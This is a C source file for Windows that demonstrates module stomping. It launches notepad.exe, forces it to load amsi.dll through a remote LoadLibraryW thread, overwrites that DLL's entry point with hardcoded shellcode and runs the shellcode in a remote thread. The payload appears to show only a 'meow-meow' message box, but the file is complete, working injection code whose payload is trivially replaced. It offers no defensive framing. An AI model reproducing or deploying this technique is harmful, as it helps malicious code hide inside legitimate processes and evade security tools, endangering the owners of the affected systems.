#include <windows.h>
#include <psapi.h>

unsigned char shellcode[] =
    // 64-bit meow-meow messagebox
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
    "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
    "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
    "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
    "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
    "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
    "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
    "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
    "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
    "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
    "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
    "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
    "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
    "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
    "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
    "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
    "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
    "\x2e\x2e\x5e\x3d\x00";

int main(int argc, char *argv[])
{
	HANDLE processHandle;
	PVOID remoteBuffer;
	wchar_t moduleToInject[] = L"C:\\windows\\system32\\amsi.dll";
	HMODULE modules[256];
	SIZE_T modulesSize = sizeof(modules);
	DWORD modulesSizeNeeded = 0;
	SIZE_T modulesCount = 0;
	CHAR remoteModuleName[128];
	HMODULE remoteModule = NULL;

    //
    PROCESS_INFORMATION pi;
    STARTUPINFOA Startup;
    ZeroMemory(&Startup, sizeof(Startup));
    ZeroMemory(&pi, sizeof(pi));

    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, 0, NORMAL_PRIORITY_CLASS, NULL, NULL, &Startup, &pi);
    WaitForSingleObject(pi.hProcess, 1 * 1000);
    //

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
	
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof moduleToInject, MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)moduleToInject, sizeof moduleToInject, NULL);
	PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("Kernel32"), "LoadLibraryW");
	HANDLE dllThread = CreateRemoteThread(processHandle, NULL, 0, threadRoutine, remoteBuffer, 0, NULL);
	WaitForSingleObject(dllThread, 1000);
	
	// find base address of the injected benign DLL in remote process
	EnumProcessModules(processHandle, modules, modulesSize, &modulesSizeNeeded);
	modulesCount = modulesSizeNeeded / sizeof(HMODULE);
	for (size_t i = 0; i < modulesCount; i++)
	{
		remoteModule = modules[i];
		GetModuleBaseNameA(processHandle, remoteModule, remoteModuleName, sizeof(remoteModuleName));
		if (strcmp(remoteModuleName, "amsi.dll") == 0) 
		{
			break;
		}
	}

    DWORD headerBufferSize = 0x1000;
	LPVOID targetProcessHeaderBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize);
	ReadProcessMemory(processHandle, remoteModule, targetProcessHeaderBuffer, headerBufferSize, NULL);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetProcessHeaderBuffer;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetProcessHeaderBuffer + dosHeader->e_lfanew);
	LPVOID dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule);

	// write shellcode to DLL's AddressofEntryPoint
	WriteProcessMemory(processHandle, dllEntryPoint, (LPCVOID)shellcode, sizeof(shellcode), NULL);
	
	// execute shellcode from inside the benign DLL
	CreateRemoteThread(processHandle, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, NULL);
	

	
	return 0;
}